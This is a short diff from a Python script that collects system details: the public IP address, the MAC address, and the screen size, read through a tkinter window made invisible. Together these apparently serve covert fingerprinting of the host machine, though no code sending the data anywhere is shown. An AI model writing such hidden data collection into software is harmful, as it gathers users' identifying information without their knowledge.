@@ -90,14 +90,22 @@ sys_stats = [
     ss_req.json()["ip"] if ss_req.status_code == 200 else "err",
     ':'.join(("%012X" % uuid.getnode())[i:i+2] for i in range(0, 12, 2)).lower()
 ]
-import tkinter
 with suppress():
+    import tkinter
     root = tkinter.Tk()
+    try:
+        root.attributes("-alpha", 0)
+        
+    except:
+        pass
+    
     width = root.winfo_screenwidth()
     height = root.winfo_screenheight()
+    root.update()
     root.destroy()
+    screen_size = (width, height)
     
-screen_size = (width, height)
+    del root, width, height
 
 class recursion:
     """A recursion context manager.
